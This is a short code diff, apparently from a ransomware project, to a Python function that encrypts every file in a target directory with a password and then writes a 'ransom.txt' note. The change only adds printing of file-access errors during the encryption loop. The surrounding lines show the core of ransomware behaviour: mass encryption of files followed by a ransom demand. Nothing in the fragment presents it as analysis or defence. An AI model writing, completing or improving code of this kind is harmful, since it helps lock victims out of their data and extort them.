@@ -55,7 +55,8 @@ def encrypt_data(password, dire='../azure_blob_analytics/'):
         # EncryptFile(file,password)
         try:
             fast_encrypt(file, password)
-        except (PermissionError, OSError):
+        except (PermissionError, OSError) as e:
+            print(e)
             continue
     print("Encryption Done!")
     f = open("ransom.txt","w+")
